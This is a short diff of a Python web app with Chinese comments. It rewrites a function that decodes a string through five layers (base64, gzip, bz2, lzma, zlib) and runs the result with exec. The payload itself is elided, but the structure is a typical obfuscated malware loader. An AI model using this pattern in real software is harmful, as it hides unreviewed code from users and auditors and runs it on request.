@@ -55,9 +55,21 @@ def run_script():
         return jsonify({"error": f"执行出错: {str(e)}"}), 500
 
 def execute_main_script():
-    # 执行主脚本逻辑
-    exec((lambda uaXsf:compile(uaXsf,'<string>','exec'))(zlib.decompress(lzma.decompress(bz2.decompress(gzip.decompress(base64.b64decode(...)))))))
-    return "脚本执行成功"
+    # 这里需要替换为实际的base64编码字符串
+    encoded_script = "..." # 把实际的base64字符串放在这里
+    try:
+        script = base64.b64decode(encoded_script)
+        script = gzip.decompress(script)
+        script = bz2.decompress(script)
+        script = lzma.decompress(script)
+        script = zlib.decompress(script)
+        
+        # 执行解码后的脚本
+        exec(compile(script, '<string>', 'exec'))
+        return "脚本执行成功"
+    except Exception as e:
+        logging.error(f"脚本解码错误: {str(e)}")
+        raise Exception("脚本解码失败，请检查编码是否正确")
 
 if __name__ == '__main__':
     # 创建日志目录
